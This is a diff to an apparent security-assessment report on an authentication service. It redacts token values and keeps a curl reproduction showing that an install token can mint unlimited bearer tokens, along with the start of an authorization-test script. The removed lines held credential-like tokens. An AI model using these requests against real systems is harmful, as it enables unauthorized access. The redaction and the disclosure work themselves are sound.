@@ -76,7 +76,7 @@ The single `200` among 78 properly-secured `403`s is the authorization gap. The 
 ### Concrete matrix script
 
 ```bash
-WS_TOKEN="hypwo-cbdb2734-3647-4216-b54e-00acf1e63ec6"   # WORKSTATION-scoped
+WS_TOKEN="hypwo-token"   # WORKSTATION-scoped
 
 python3 -c "
 import json,subprocess
@@ -430,12 +430,12 @@ The 89-day Bearer vs unexpiring install is the key TTL asymmetry.
 ### F8 — infinite mintability (still live post-patch)
 
 ```bash
-INSTALL_TOKEN="hypws-41ae1881-e0e3-4f64-b6e7-5a2b22283bb6"
+INSTALL_TOKEN="hypws-token"
 
 curl -s -X POST "https://tenant-001.cdn.acmeauth.example/rp/token/endpoint/exchange/installtoken" \
   -H 'Content-Type: application/json' \
   -d '{"wsinstallToken":{"token":"'"$INSTALL_TOKEN"'","machineId":"retest","rpAppId":"AcmeAuthDefaultWorkstationApplication"}}'
-# {"token":"hypwo-42288d91-f4a0-4162-9c45-6f72f1e5dbdf","expiryDate":1792853004673}
+# {"token":"hypwo-token","expiryDate":1792853004673}
 ```
 
 10 consecutive mints produced 10 distinct Bearer tokens. The `rpAppId` is validated (mismatch → 403) but within the same rpAppId, unlimited tokens. AcmeAuth's 2026-07-23/24 patch closed the *downstream* IdP endpoints but **did not touch the token-issuance surface**.
